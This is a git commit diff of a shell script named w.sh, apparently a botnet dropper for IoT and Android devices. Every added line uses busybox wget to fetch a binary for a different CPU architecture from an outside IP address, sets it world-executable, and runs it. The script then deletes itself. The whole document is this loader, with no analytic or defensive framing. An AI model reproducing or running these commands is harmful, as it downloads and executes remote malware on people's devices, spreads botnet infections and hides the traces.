3dd79f381849d4de79bb02a2df06cb8884a6d71a
BumBOBI <82254612+BumBOBI@users.noreply.github.com>
2025-04-25 23:09:55 +0700

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,14 +1,14 @@
-curl http://127.0.0.1/arm; chmod 777 arm; ./arm android
-curl http://127.0.0.1/arm5; chmod 777 arm5; ./arm5 android
-curl http://127.0.0.1/arm6; chmod 777 arm6; ./arm6 android
-curl http://127.0.0.1/arm7; chmod 777 arm7; ./arm7 android
-curl http://127.0.0.1/sh4; chmod 777 sh4; ./sh4 android
-curl http://127.0.0.1/arc; chmod 777 arc; ./arc android
-curl http://127.0.0.1/mips; chmod 777 mips; ./mips android
-curl http://127.0.0.1/mipsel; chmod 777 mipsel; ./mipsel android
-curl http://127.0.0.1/sparc; chmod 777 sparc; ./sparc android
-curl http://127.0.0.1/x86_64; chmod 777 x86_64; ./x86_64 android
-curl http://127.0.0.1/i686; chmod 777 i686; ./i686 android
-curl http://127.0.0.1/i586; chmod 777 i586; ./i586 android
+busybox wget http://103.77.240.231/arm; chmod 777 arm; ./arm android
+busybox wget http://103.77.240.231/arm5; chmod 777 arm5; ./arm5 android
+busybox wget http://103.77.240.231/arm6; chmod 777 arm6; ./arm6 android
+busybox wget http://103.77.240.231/arm7; chmod 777 arm7; ./arm7 android
+busybox wget http://103.77.240.231/sh4; chmod 777 sh4; ./sh4 android
+busybox wget http://103.77.240.231/arc; chmod 777 arc; ./arc android
+busybox wget http://103.77.240.231/mips; chmod 777 mips; ./mips android
+busybox wget http://103.77.240.231/mipsel; chmod 777 mipsel; ./mipsel android
+busybox wget http://103.77.240.231/sparc; chmod 777 sparc; ./sparc android
+busybox wget http://103.77.240.231/x86_64; chmod 777 x86_64; ./x86_64 android
+busybox wget http://103.77.240.231/i686; chmod 777 i686; ./i686 android
+busybox wget http://103.77.240.231/i586; chmod 777 i586; ./i586 android
 
 rm $0
